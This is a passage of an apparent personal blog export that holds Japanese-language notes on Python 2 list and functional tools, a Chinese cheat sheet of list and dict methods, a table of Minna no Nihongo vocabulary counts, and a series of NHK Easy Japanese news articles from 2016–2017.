class=\\\"python\\\">>>> seq = [3,2,5,6,8,9,10]\\n>>> filter(lambda x : x < 6, seq)\\n[3, 2, 5]\\n</code></pre>\\n* `map(function, sequence)` は、シーケンス `sequence` の各要素 `item` に対して `function(item)` を呼び出し、その戻り値からなるリストを返します。複数のシーケンスを渡すこともできます。その場合、第一引数の関数はシーケンスの数と等しい数の引数を受け取る必要があり、各シーケンスの値が渡されます。 (幾つかのシーケンスが他のシーケンスよりも短かった場合は、その場所には `None` が渡されます。) \\n<pre><code class=\\\"python\\\">>>> seqA = [3,5,6,9]\\n>>> seqB = [4,6,8]\\n>>> map(lambda x,y:x+y, seqA, seqA)\\n[6, 10, 12, 18]\\n>>> map(None, seqA, seqA)\\n[(3, 3), (5, 5), (6, 6), (9, 9)]\\n>>> map(None, seqA, seqB)\\n[(3, 4), (5, 6), (6, 8), (9, None)]\\n>>> map(lambda x,y:x+y, seqA, seqB)\\nTraceback (most recent call last):\\n  File \\\"<stdin>\\\", line 1, in <module>\\n  File \\\"<stdin>\\\", line 1, in <lambda>\\nTypeError: unsupported operand type(s) for +: 'int' and 'NoneType'\\n</code></pre>\\n* `reduce(function, sequence)` は単一の値を返します。この値は 2 つの引数をとる関数 `function` をシーケンス `sequence` の最初の二つの要素を引数として呼び出し、次にその結果とシーケンスの次の要素を引数にとり、以降これを繰り返していきます。シーケンス中にただ一つしか要素がなければ、その値自体が返されます。シーケンスが空なら、例外が送出されます。3 つめの引数をわたして、初期値を指定することもできます。この場合、空のシーケンスを渡すと初期値が返されます。それ以外の場合には、まず初期値とシーケンス中の最初の要素に対して関数が適用され、次いでその結果とシーケンスの次の要素に対して適用され、以降これが繰り返されます。\\n<pre><code class=\\\"python\\\">>>> reduce(lambda x,y:x+y, range(10))\\n45\\n>>> reduce(lambda x,y:x+y, range(10),10)\\n55\\n>>> reduce(lambda x,y:x+y, [],10)\\n10\\n>>> reduce(lambda x,y:x+y, [])\\nTraceback (most recent call last):\\n  File \\\"<stdin>\\\", line 1, in <module>\\nTypeError: reduce() of empty sequence with no initial value\\n>>> reduce(lambda x,y:x+y, [3])\\n3\\n</code></pre>\\n* リストから要素を削除する際、値を指定する代わりにインデックスを指定する方法があります。それが `del` 文です。これは `pop()` メソッドと違い、値を返しません。 `del` 文はリストからスライスを除去したり、リスト全体を削除することもできます(以前はスライスに空のリストを代入して行っていました)。例えば以下のようにします:\\n<pre><code class=\\\"python\\\">>>> a = [-1, 1, 66.25, 333, 333, 1234.5]\\n>>> del a[0]\\n>>> a\\n[1, 66.25, 333, 333, 1234.5]\\n>>> del a[2:4]\\n>>> a\\n[1, 66.25, 1234.5]\\n>>> del a[:]\\n>>> a\\n[]\\n>>> del a\\n</code></pre>\\n* シーケンスにわたるループを行う際、 `enumerate()` 関数を使うと、要素のインデックスと要素を同時に取り出すことができます。\\n<pre><code class=\\\"python\\\">>>> for i, v in enumerate(['tic', 'tac', 'toe']):\\n...     print i, v\\n...\\n0 tic\\n1 tac\\n2 toe\\n</code></pre>\\n* 二つまたはそれ以上のシーケンス型を同時にループするために、関数 `zip()` を使って各要素をひと組みにすることができます。\\n<pre><code class=\\\"python\\\">>>> questions = ['name', 'quest', 'favorite color']\\n>>> answers = ['lancelot', 'the holy grail', 'blue']\\n>>> for q, a in zip(questions, answers):\\n...     print 'What is your {0}?  It is {1}.'.format(q, a)\\n...\\nWhat is your name?  It is lancelot.\\nWhat is your quest?  It is the holy grail.\\nWhat is your favorite color?  It is blue.\\n</code></pre>\\n* シーケンスを逆方向に渡ってループするには、まずシーケンスの範囲を順方向に指定し、次いで関数 `reversed()` を呼び出します。\\n<pre><code class=\\\"python\\\">>>> for i in reversed(xrange(1,10,2)):\\n...     print i\\n...\\n9\\n7\\n5\\n3\\n1\\n</code></pre>\\n* シーケンスをソートされた順序でループするには、 `sorted()` 関数を使います。この関数は元の配列を変更せず、ソート済みの新たな配列を返します。\\n<pre><code class=\\\"python\\\">>>> basket = ['apple', 'orange', 'apple', 'pear', 'orange', 'banana']\\n>>> for f in sorted(set(basket)):\\n...     print f\\n...\\napple\\nbanana\\norange\\npear\\n</code></pre>\\n* ときどきループ内でリストを変更したい誘惑に駆られるでしょうが、代わりに新しいリストを作ってしまうほうがより簡単で安全なことが、ままあります\\n<pre><code class=\\\"python\\\">>>> words = ['cat', 'window', 'defenestrate']\\n>>> for w in words[:]:  # Loop over a slice copy of the entire list.\\n...     if len(w) > 6:\\n...         words.insert(0, w)\\n...\\n>>> words\\n['defenestrate', 'cat', 'window', 'defenestrate']\\n</code></pre>\\n#####入力と出力\\n* 2 乗と 3 乗の値からなる表を書く二つの方法を示します\\n<pre><code class=\\\"python\\\">>>> for x in range(1, 11):\\n...     print repr(x).rjust(2), repr(x*x).rjust(3),\\n...     # Note trailing comma on previous line\\n...     print repr(x*x*x).rjust(4)\\n...\\n 1   1    1\\n 2   4    8\\n 3   9   27\\n 4  16   64\\n 5  25  125\\n 6  36  216\\n 7  49  343\\n 8  64  512\\n 9  81  729\\n10 100 1000\\n\\n>>> for x in range(1,11):\\n...     print '{0:2d} {1:3d} {2:4d}'.format(x, x*x, x*x*x)\\n...\\n 1   1    1\\n 2   4    8\\n 3   9   27\\n 4  16   64\\n 5  25  125\\n 6  36  216\\n 7  49  343\\n 8  64  512\\n 9  81  729\\n10 100 1000\\n</code></pre>\\n* もう一つのメソッド、`str.zfill()` は、数値文字列の左側をゼロ詰めします。このメソッドは正と負の符号を正しく扱います\\n<pre><code class=\\\"python\\\">>>> '12'.zfill(5)\\n'00012'\\n>>> '-3.14'.zfill(7)\\n'-003.14'\\n>>> '3.14159265359'.zfill(5)\\n'3.14159265359'\\n</code></pre>\\n* str.format()\\n<pre><code class=\\\"python\\\">>>> print 'We are the {} who say \\\"{}!\\\"'.format('knights', 'Ni')\\nWe are the knights who say \\\"Ni!\\\"\\n>>> print '{0} and {1}'.format('spam', 'eggs')\\nspam and eggs\\n>>> print '{1} and {0}'.format('spam', 'eggs')\\neggs and spam\\n>>> print 'This {food} is {adjective}.'.format(\\n...       food='spam', adjective='absolutely horrible')\\nThis spam is absolutely horrible.\\n>>> print 'The story of {0}, {1}, and {other}.'.format('Bill', 'Manfred',\\n...                                                    other='Georg')\\nThe story of Bill, Manfred, and Georg.\\n</code></pre>\\n#####エラーと例外\\n* 一つの `try` 文に複数の `except` 節を設けて、さまざまな例外に対するハンドラを指定することができます。同時に一つ以上のハンドラが実行されることはありません。ハンドラは対応する `try` 節内で発生した例外だけを処理し、同じ `try` 文内の別の例外ハンドラで起きた例外は処理しません。 `except` 節には複数の例外を丸括弧で囲ったタプルにして渡すことができます。このタプルの周囲の括弧は必要です。\\n<pre><code class=\\\"python\\\">... except (RuntimeError, TypeError, NameError):\\n...     pass\\n</code></pre>\\n* `try ... except` 文には、オプションで `else` 節 (else clause) を設けることができます。 `else` 節を設ける場合、全ての `except` 節よりも後ろに置かなければなりません。 `else` 節は `try` 節で全く例外が送出されなかったときに実行されるコードを書くのに役立ちます。\\n<pre><code class=\\\"python\\\">for arg in sys.argv[1:]:\\n    try:\\n        f = open(arg, 'r')\\n    except IOError:\\n        print 'cannot open', arg\\n    else:\\n        print arg, 'has', len(f.readlines()), 'lines'\\n        f.close()\\n</code></pre>\\n* 定義済みクリーンアップ処理\\n<pre><code class=\\\"python\\\">with open(\\\"myfile.txt\\\") as f:\\n    for line in f:\\n        print line,\\n</code></pre>\\n####Library\\n#####list\\nL = range(1,5)      #即 L=[1,2,3,4],不含最后一个元素\\nL = range(1, 10, 2) #即 L=[1, 3, 5, 7, 9]\\n\\nlist的方法\\nL.append(var)   #追加元素\\nL.insert(index,var)\\nL.pop(var)      #返回最后一个元素，并从list中删除之\\nL.remove(var)   #删除第一次出现的该元素\\nL.count(var)    #该元素在列表中出现的个数\\nL.index(var)    #该元素的位置,无则抛异常 \\nL.extend(list)  #追加list，即合并list到L上\\nL.sort()        #排序\\nL.reverse()     #倒序\\nlist 操作符:,+,*，关键字del\\na[1:]       #片段操作符，用于子list的提取\\n[1,2]+[3,4] #为[1,2,3,4]。同extend()\\n[2]*4       #为[2,2,2,2]\\ndel L[1]    #删除指定下标的元素\\ndel L[1:3]  #删除指定下标范围的元素\\n#####dict\\nD.get(key, 0)       #同dict[key]，多了个没有则返回缺省值，0。[]没有则抛异常\\nD.has_key(key)      #有该键返回TRUE，否则FALSE\\nD.keys()            #返回字典键的列表\\nD.values()\\nD.items()\\n\\nD.update(dict2)     #增加合并字典\\nD.popitem()         #得到一个pair，并从字典中删除它。已空则抛异常\\nD.clear()           #清空字典，同del dict\\nD.copy()            #拷贝字典\\nD.cmp(dict1,dict2)  \\n#####tuple\\ntuple = ('a', 'b', 'c', 'd', 'e')\\n可以用list的 [],:操作符提取元素。就是不能直接修改元素。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"\">日本語</h2>\n<h3 id=\"\">単語</h3>\n<table border=\"1\">\n<tr>\n<th>位置</th>\n<th>単語数量</th>\n</tr>\n<tr>\n<td>みんなの日本語第一課</td>\n<td>43</td>\n</tr>\n<tr>\n<td>みんなの日本語第二課</td>\n<td>67</td>\n</tr>\n<tr>\n<td>みんなの日本語第三課</td>\n<td>57</td>\n</tr>\n<tr>\n<td>みんなの日本語第四課</td>\n<td>60</td>\n</tr>\n<tr>\n<td>みんなの日本語第五課</td>\n<td>72</td>\n</tr>\n<tr>\n<td>みんなの日本語第六課</td>\n<td>87</td>\n</tr>\n<tr>\n<td>みんなの日本語第七課</td>\n<td>53</td>\n</tr>\n<tr>\n<td>みんなの日本語第八課</td>\n<td>71</td>\n</tr>\n<tr>\n<td>みんなの日本語第九課</td>\n<td>73</td>\n</tr>\n<tr>\n<td>みんなの日本語第十課</td>\n<td>52</td>\n</tr>\n<tr>\n<td>ここまで</td>\n<td>635</td>\n</tr>\n<tr>\n<td>みんなの日本語第十一課</td>\n<td>79</td>\n</tr>\n<tr>\n<td>みんなの日本語第十二課</td>\n<td>51</td>\n</tr>\n<tr>\n<td>みんなの日本語第十三課</td>\n<td>60</td>\n</tr>\n<tr>\n<td>みんなの日本語第十四課</td>\n<td>40</td>\n</tr>\n<tr>\n<td>みんなの日本語第十五課</td>\n<td>43</td>\n</tr>\n<tr>\n<td>みんなの日本語第十六課</td>\n<td>45</td>\n</tr>\n<tr>\n<td>みんなの日本語第十七課</td>\n<td>66</td>\n</tr>\n<tr>\n<td>みんなの日本語第十八課</td>\n<td>44</td>\n</tr>\n<tr>\n<td>みんなの日本語第十九課</td>\n<td>40</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十課</td>\n<td>21</td>\n</tr>\n<tr>\n<td>ここまで</td>\n<td>489 / 1124</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十一課</td>\n<td>50</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十二課</td>\n<td>32</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十三課</td>\n<td>40</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十四課</td>\n<td>25</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十五課</td>\n<td>20</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十六課</td>\n<td>60</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十七課</td>\n<td>70</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十八課</td>\n<td>50</td>\n</tr>\n<tr>\n<td>みんなの日本語第二十九課</td>\n<td>57</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十課</td>\n<td>53</td>\n</tr>\n<tr>\n<td>ここまで</td>\n<td>457 / 1581</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十一課</td>\n<td>76</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十二課</td>\n<td>70</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十三課</td>\n<td>60</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十四課</td>\n<td>91</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十五課</td>\n<td>55</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十六課</td>\n<td>60</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十七課</td>\n<td>66</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十八課</td>\n<td>44</td>\n</tr>\n<tr>\n<td>みんなの日本語第三十九課</td>\n<td>55</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十課</td>\n<td>70</td>\n</tr>\n<tr>\n<td>ここまで</td>\n<td>647 / 2228</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十一課</td>\n<td>50</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十二課</td>\n<td>65</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十三課</td>\n<td>45</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十四課</td>\n<td>55</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十五課</td>\n<td>35</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十六課</td>\n<td>80</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十七課</td>\n<td>48</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十八課</td>\n<td>28</td>\n</tr>\n<tr>\n<td>みんなの日本語第四十九課</td>\n<td>32</td>\n</tr>\n<tr>\n<td>みんなの日本語第五十課</td>\n<td>34</td>\n</tr>\n<tr>\n<td>ここまで</td>\n<td>472 / 2700</td>\n</tr>\n</table>\n###ニュース\n#### [ニュース_01](http://www3.nhk.or.jp/news/easy/k10010810471000/k10010810471000.html)\n<blockquote>\n<p>４月１４日、熊本県でマグニチュード６.５（Ｍ６．５）の地震がありました。熊本県の益城町では、震度７のとても強い揺れがありました。震度７以上の地震は、２０１１年３月の東日本大震災のあと初めてでした。\n</p>\n<p>４月１６日には、マグニチュード７．３（Ｍ７．３）のもっと大きな地震がありました。そのあとも熊本県や隣の大分県で地震が続きました。\n</p>\n<p>この地震で、熊本県では１２月２０日までに１６０人が亡くなりました。この中の１０４人は、避難したあと体の具合が悪くなったりして亡くなりました。\n</p>\n<p>\n地震で壊れた家は１７万軒以上ありました。県は、家が壊れた人などがしばらく住む家を約４３００軒建てました。田んぼや畑にひびが入って農業ができなくなった人などもいました。有名な城の熊本城でも、建物が壊れました。\n</p>\n<p>\n地震の前のように戻るためには、しなければならないことがたくさんあります。\n</p>\n</blockquote>\n#### [ニュース_02](http://www3.nhk.or.jp/news/easy/k10010822341000/k10010822341000.html)\n<blockquote>\n<p>\nアメリカの映画「スター・ウォーズ」に出た俳優、キャリー・フィッシャーさんが１２月２７日に亡くなりました。６０歳でした。\n</p>\n<p>\nフィッシャーさんは、１９７７年にヒロインのレイア姫になって、とても勇気がある強い女性を演じました。「スター・ウォーズ」は世界中で人気が出て、シリーズになりました。フィッシャーさんは、その２つ目と３つ目の映画にも出ました。それから３２年が過ぎた去年、新しい「スター・ウォーズ」の映画でまたレイア姫になりました。\n</p>\n<p>\n監督のジョージ・ルーカスさんは「フィッシャーさんはとても頭がいい俳優でした。レイア姫を上手に演じました」と話しました。\n</p>\n</blockquote>\n#### [ニュース_03](http://www3.nhk.or.jp/news/easy/k10010820221000/k10010820221000.html)\n<blockquote>\n<p>\n北海道の海では今、「毛ガニ」を取っています。毛ガニなどのかには、正月の準備をする今の季節に買う人が多くなります。\n</p>\n<p>\n北海道の白糠町では１２月２６日の朝、全部で５００ｋｇの毛ガニが取れました。港では、取ってきたかにを大きさで分けました。甲羅の大きさが１０ｃｍ以上の大きい毛ガニは、競りで１ｋｇ９６００円になりました。去年の同じときより１５００円ぐらい高かくなりました。\n</p>\n<p>\n白糠漁協によると、今年は１２月になってから取ってくる毛ガニが少なくなりました。ロシアからの輸入も少なくなったため、いつもの年より値段が高くなっています。白糠町の毛ガニは、日本のいろいろな市場に送っています。\n</p>\n</blockquote>\n#### [ニュース_04](http://www3.nhk.or.jp/news/easy/k10010810711000/k10010810711000.html)\n<blockquote>\n<p>\n１１月８日、アメリカの次の大統領を選ぶ選挙で、共和党のトランプさんが民主党のクリントンさんに勝ちました。トランプさんはビルやホテルなどをたくさん持っていることで有名ですが、今までに政治の仕事をしたことはありません。\n</p>\n<p>\nトランプさんは「アメリカとメキシコの間に壁を作る」とか「法律を守らないでアメリカに来た移民は国に帰らせる」などと言っています。そして、太平洋の周りの国が自由に貿易できるようにする協定のＴＰＰにも入らないと言っています。\n</p>\n<p>\nトランプさんは２０１７年１月２０日にアメリカの大統領になります。アメリカや世界の人たちは、トランプさんが今までに言ったことを本当に行うかどうか注目しています。\n</p>\n</blockquote>\n#### [ニュース_05](http://www3.nhk.or.jp/news/easy/k10010815741000/k10010815741000.html)\n<blockquote>\n<p>\n１月１日、働きながら育児や介護をしている人が仕事を休みやすくするため、法律が変わります。\n</p>\n<p>\n３月、野球の世界大会「ＷＢＣ」が日本と韓国とアメリカであります。\n</p>\n<p>\n４月１日、都市ガスを使う人は自由にガスの会社を選ぶことができるようになります。今までは住んでいる場所で会社が決まっていました。\n</p>\n<p>\n４月１日、ブロックのおもちゃ「レゴ」のテーマパーク「レゴランド」が名古屋にできます。\n</p>\n<p>\n５月、２０１９年に日本で開くラグビーのワールドカップでどのチームとどのチームが試合をするか決まります。\n</p>\n<p>\n８月ごろ、東京にある文化庁が京都のどの場所に移るか決まります。早い場合で２０１９年に移ります。\n</p>\n<p>\n９月、東京の次の２０２４年のオリンピックとパラリンピックをどこで開くか決まります。\n</p>\n<p>\n１１月ごろ、日本人で１２人目の宇宙飛行士の金井宣茂さんが国際宇宙ステーションに行きます。\n</p>\n</blockquote>\n#### [ニュース_06](http://www3.nhk.or.jp/news/easy/k10010850561000/k10010850561000.html)\n<blockquote>\n<p>\n鳥取県や兵庫県などでは、２３日から雪がたくさん降りました。\n</p>\n<p>\n鳥取県の高速道路では２３日の午後から、雪が積もって車が動くことができなくなりました。多いときは６０台ぐらいの車が止まっていました。\n</p>\n<p>\n鳥取県智頭町では雪が１m以上積もって、道で２６０台以上の車が動くことができなくなりました。車に乗っていた８２人が智頭町の公民館などに避難しました。自衛隊が車に乗っている人に食べ物や毛布などを配りました。\n</p>\n</blockquote>\n#### [ニュース_07](http://www3.nhk.or.jp/news/easy/k10010829471000/k10010829471000.html)\n<blockquote>\n<p>\n東京の築地市場で５日の朝、今年初めての競りがありました。競りには、日本中の港や外国からたくさんのまぐろが集まりました。今年最も高い値段になったのは、青森県の大間で取れた２１２ｋｇのまぐろでした。値段は７４２０万円で、今までで２番目に高くなりました。\n</p>\n<p>\n築地市場は古くなったため、新しく作った豊洲市場に去年の１１月に引っ越す予定でした。しかし、豊洲市場の下にある土から体に悪い物質が見つかったため、いつ引っ越すことができるかわからなくなりました。\n</p>\n<p>\n東京都の小池知事は、早い場合は今年の冬に豊洲市場に引っ越すことができると言っています。このため、築地市場での競りは今年で終わる可能性があります。\n</p>\n</blockquote>\n#### [ニュース_08](http://www3.nhk.or.jp/news/easy/k10010853761000/k10010853761000.html)\n<blockquote>\n<p>\n東京で２６日、スマートフォンを使って体に障害がある人や外国人に声で道を案内する実験がありました。\n</p>\n<p>\n目に障害がある女性が、スマートフォンに向かって行きたい店の名前を話すと、「右に曲がって進んでください」などと声で案内します。車いすを使っている人には、階段やエスカレーターを使わない道などを伝えます。外国人のために英語で案内をすることもできます。\n</p>\n<p>\nこのサービスを作った会社によると、今案内できるのは東京都の中央区の一部の場所だけです。会社は、オリンピックとパラリンピックを行う２０２０年までに、東京のどこでも使うことができるようにしたいと言っています。\n</p>\n</blockquote>\n#### [ニュース_09](http://www3.nhk.or.jp/news/easy/k10010852281000/k10010852281000.html)\n<blockquote>\n<p>\n１月２８日は中国の正月の「春節」で、中国から多くの人が日本に旅行に来ます。農協や米を売る会社などの団体は２５日から、中国から旅行に来る人にパックに入ったごはんをプレゼントしています。\n</p>\n<p>\n８つの観光案内所や電化製品を売る東京の店などで、３月までに１０万個プレゼントします。東京駅の前にある観光案内所では２５日、電子レンジで温めたごはんを中国人に食べてもらって、アンケートも行いました。\n</p>\n<p>\n日本では、最近米があまり売れなくなっています。このため、農協などの団体は日本の米を輸出したいと考えて、中国人に宣伝することにしました。団体の人は「日本のおいしい米を多くの人に知ってもらいたいです」と話していました。\n</p>\n</blockquote>\n#### [ニュース_10](http://www3.nhk.or.jp/news/easy/k10010851781000/k10010851781000.html)\n<blockquote>\n<p>\n沖縄県北谷町にある遺跡で、漢字の「工」の字のような模様がある土器の一部が見つかりました。土器は土を焼いて作った食器などです。\n</p>\n<p>\n北谷町が調べると、２５００年ぐらい前の縄文時代の終わりに、東北地方などにあった土器に似ていることがわかりました。この土器は「亀ヶ岡式土器」と言っていて、沖縄県で見つかったのは初めてです。\n</p>\n<p>\nこの遺跡では、縄文時代の次の弥生時代の土器も見つかっています。北谷町は「この時代に文化の交流があったことがわかります」と言っています。\n</p>\n</blockquote>\n#### [ニュース_11](https://www3.nhk.or.jp/news/easy/k10010847101000/k10010847101000.html)\n<blockquote>\n<p>\n水産庁は、２０１６年度の日本の海の「スルメイカ」などの量について発表しました。スルメイカはイカの中で最もたくさんとれて、日本でよく食べます。\n</p>\n<p>\n水産庁によると、太平洋の方にいるスルメイカの量は、３３万４０００ｔでした。前の年度より３０％以上少くなくなりました。日本海の方にいるスルメイカの量も少くなくなりました。このため、去年日本でとれたスルメイカの量は、いつもの年の半分以下になったと考えられています。\n</p>\n<p>\n水産庁は、スルメイカが卵を産むと言われている東シナ海の水の温度が低くなって、卵を産みにくくなっていることも原因の１つだと言っています。このほかにも少くなくなっている魚があって、大きな問題になっています。\n</p>\n</blockquote>\n#### [ニュース_12](https://www3.nhk.or.jp/news/easy/k10010845481000/k10010845481000.html)\n<blockquote>\n<p>\nもうすぐ花粉が飛ぶ季節になります。花粉が飛び始めると、花粉症の人はひどいくしゃみが出たり、目がかゆくなったりして大変です。\n</p>\n<p>\n東京都によると、今年の春に飛ぶ杉やひのきの花粉は、東京都では１cm²に３８００個〜５２００個になりそうです。去年と同じぐらいです。花粉が飛び始めるのは２月１５日〜１８日ごろになりそうです。\n</p>\n<p>\n花粉は、暖かい日や風が強くて空気が乾いている晴れた日にたくさん飛びます。杉の花粉は３月、ひのきの花粉は４月に特に多くなって、５月中旬まで飛びそうです。\n</p>\n<p>\n東京都は、かぜなどで体が弱くなっていると花粉症がひどくなるため、健康に気をつけるように言っています。\n</p>\n</blockquote>\n#### [ニュース_13](https://www3.nhk.or.jp/news/easy/k10010843401000/k10010843401000.html)\n<blockquote>\n<p>\n日本へ旅行に来た外国人が日本人と会話をするときに便利なカードを、東京にある印刷会社などが作りました。\n</p>\n<p>\nカードには日本語と英語と中国語で「泊まることができる場所はありますか」とか「トイレはどこですか」などと書いてあります。日本語を話すことができなくても、このカードを見せてコミュニケーションをすることができます。\n</p>\n<p>\nこのカードは無料で、今年の春から東京の浅草のレストランやホテルなどに置きます。インターネットを使うための無線のＷｉ－Ｆｉの場所などがわかる地図も一緒にもらうことができます。\n</p>\n</blockquote>\n#### [ニュース_14](https://www3.nhk.or.jp/news/easy/k10010843331000/k10010843331000.html)\n<blockquote>\n<p>\n会社が社員などを長い時間働かせることが問題になっています。厚生労働省は、去年４月から残業が１か月に８０時間より多い人がいる場合、会社などに行って調べています。９月までの半年で約１万の会社などを調べました。\n</p>\n<p>\n調べた結果、４４％の約４４００の会社などで、会社と社員で決めた時間より長く残業させていたことがわかりました。残業代を払っていないところは６００以上ありました。健康診断をしていないところもあって、６０％以上の会社などが法律に違反していました。\n</p>\n</blockquote>\n#### [ニュース_15](https://www3.nhk.or.jp/news/easy/k10010836891000/k10010836891000.html)\n<blockquote>\n<p>\n日本マイクロソフトによると、１２日から、うそのメールがたくさん見つかっています。うそのメールは、「マイクロソフト社のセキュリティチーム」が送ったように書いてあります。メールのタイトルは「ご注意！ＯＦＦＩＣＥのプロダクトキーが不正コピーされています」などです。\n</p>\n<p>\nメールには、ワードやエクセルなどのソフトウエアを使うときに必要なプロダクトキーがほかの人にコピーされたと書いてあります。そして、メールに出ているリンクをクリックするように書いてあります。クリックすると、うそのウェブサイトが開きます。\n</p>\n<p>\n日本マイクロソフトは、コンピューターにウイルスが入ったり、自分の情報が盗まれたりする危険があるため、うそのメールは開かないで消すように言っています。\n</p>\n</blockquote>\n#### [ニュース_16](https://www3.nhk.or.jp/news/easy/k10010834181000/k10010834181000.html)\n<blockquote>\n<p>\n三菱総合研究所は、人のように自分で考えるコンピューターのＡＩやロボットなどを使うことが増えると、人の仕事がどのように変わるか調べました。\n</p>\n<p>\n研究所によると、２０３０年にはＡＩを使って専門の仕事をする人などが増えて、全部で５００万人がする仕事が増えます。しかし、物を作る工場などではＡＩやロボットが人の代わりに仕事をするため、７４０万人がする仕事がなくなります。このため、計算すると２４０万人がする仕事がなくなります。\n</p>\n<p>\n研究所は、新しい技術を使うことができなくて仕事がなくなる人が増えないように考えることが必要だと言っています。\n</p>\n</blockquote>\n#### [ニュース_17](https://www3.nhk.or.jp/news/easy/k10010849581000/k10010849581000.html)\n<blockquote>\n<p>\nスマートフォンでお金を払うことができる「アリペイ」というサービスは、中国で４億人以上が利用しています。コンビニのローソンは、１月２４日から日本にある全部の店でこのサービスを利用できるようにしました。\n</p>\n<p>\n１月２８日から中国の正月の「春節」が始まります。ローソンは、春節に日本へ旅行に来るたくさんの中国人に買い物をしてほしいと考えています。\n</p>\n<p>\n日本では、ほかにも「アリペイ」を利用できる店があります。福岡市では、市と商店街がこのサービスを始めるための実験を行っています。\n</p>\n</blockquote>\n#### [ニュース_18](https://www3.nhk.or.jp/news/easy/k10010844481000/k10010844481000.html)\n<blockquote>\n<p>\n中国の福建省にある「パンダ研究センター」にいるパンダが、「世界で最も長く生きているパンダ」というギネスの記録になりました。このパンダはことし３７歳になる雌の「バス」で、人間の年にすると１００歳以上です。\n</p>\n<p>\nパンダ研究センターでは１８日、ギネスの記録になったお祝いをしました。「バス」は頭に飾りをのせて、おかゆをおいしそうに食べていました。\n</p>\n<p>\n「バス」は若いときに自転車に乗るなどいろいろな芸をして有名になりました。今は目などに少し病気がありますが、元気に生活しています。\n</p>\n</blockquote>\n#### [ニュース_19](https://www3.nhk.or.jp/news/easy/k10010861721000/k10010861721000.html)\n<blockquote>\n<p>\n警察によると、電話やメールなどでだましてお金をとる詐欺は、２０１６年に１万４１５１件ありました。詐欺でとられたお金は全部で４０６億円以上でした。前の年より少なくなりましたが、４００億円以上の年が４年続いています。\n</p>\n<p>\nいちばん多かったのは、息子や孫だとうそを言ってお金をとる詐欺でした。次に多かったのは、利用していないウェブサイトなどの料金を払えとメールや手紙を送ってくる詐欺でした。\n</p>\n<p>\n「私は役所の職員です。税金が戻ってきますよ」などと言って、ＡＴＭでお金を送らせる詐欺は、前の年より増えました。\n</p>\n<p>\nだまされた人の７８％が６５歳以上でした。警察は、銀行などともっと協力してお年寄がだまされないようにしたいと言っています。\n</p>\n</blockquote>\n#### [ニュース_20](https://www3.nhk.or.jp/news/easy/k10010866331000/k10010866331000.html)\n<blockquote>\n<p>\n北海道札幌市で６８回目の「さっぽろ雪まつり」が６日から始まりました。毎年日本や外国から２００万人以上の人が、雪や氷で作った像を見に来ます。\n</p>\n<p>\n今年は３つの会場に全部で２００の像が並んでいます。大通公園の会場には、雪で作った高１７ｍ以上の建物の像があります。有名なフランスの凱旋門です。去年「ＰＰＡＰ」の歌で有名になったピコ太郎さんの像も雪で作りました。\n</p>\n<p>\n大阪から来た女性は「初めて見ましたが、顔の細かい所まで作ってあってびっくりしました」と話していました。\n</p>\n<p>\n「さっぽろ雪まつり」は１２日までです。\n</p>\n</blockquote>\n#### [ニュース_21](http://www3.nhk.or.jp/news/easy/k10010874411000/k10010874411000.html)\n<blockquote>\n<p>\n北朝鮮は１２日、ミサイルを発射しました。ミサイルは東に５００ｋｍ飛んで日本海に落ちたと韓国は言っています。\n</p>\n<p>\n北朝鮮は「きのう新しいミサイルを発射する実験に成功した」と１３日に発表しました。\n</p>\n<p>\nミサイルの発射は、安倍総理大臣とアメリカのトランプ大統領が会って、北朝鮮は核兵器やミサイルを作るのをやめるように言ったあとでした。安倍総理大臣とトランプ大統領はすぐに北朝鮮を非難するメッセージを発表しました。安倍総理大臣は「決して許すことはできない」と言いました。\n</p>\n</blockquote>\n#### [ニュース_22](http://www3.nhk.or.jp/news/easy/k10010868931000/k10010868931000.html)\n<blockquote>\n<p>\n牛丼の「吉野家」によると、「牛丼１５，０００円分が食べ放題」などと書いたうその広告が、先月からインターネットに出ています。広告には吉野家と似ているマークや牛丼の写真も出ていました。\n</p>\n<p>\nうその広告には、別のアドレスにメールを送るように書いてあります。このアドレスにメールを送ると、吉野家とは関係のない広告のメールが届くようになります。\n</p>\n<p>\n吉野家は「私たちが出した広告ではありません」と話しています。そして、うその広告に書いてあるアドレスにメールを送らないように言っています。\n</p>\n</blockquote>\n#### [ニュース_23](http://www3.nhk.or.jp/news/easy/k10010875021000/k10010875021000.html)\n<blockquote>\n<p>\n外国人があまり知らない日本の観光地を紹介するホテルが、東京都中央区にできました。日本の観光地をインターネットのビデオで紹介している会社が作りました。\n</p>\n<p>\nホテルの１階にはコンピューターと大きなテレビがあって、いろいろな観光地のビデオを見たり、行き方を調べたりできます。ホテルによると、外国人にもっと来てほしいと考えている市や町がたくさんあります。\n</p>\n<p>\n働いている人はほとんどが外国人で、日本のいろいろな観光地をよく知っている人たちです。ホテルは「日本に来た外国人に、今まで知らなかった場所にも行ってほしいと思います」と話しています。\n</p>\n</blockquote>\n#### 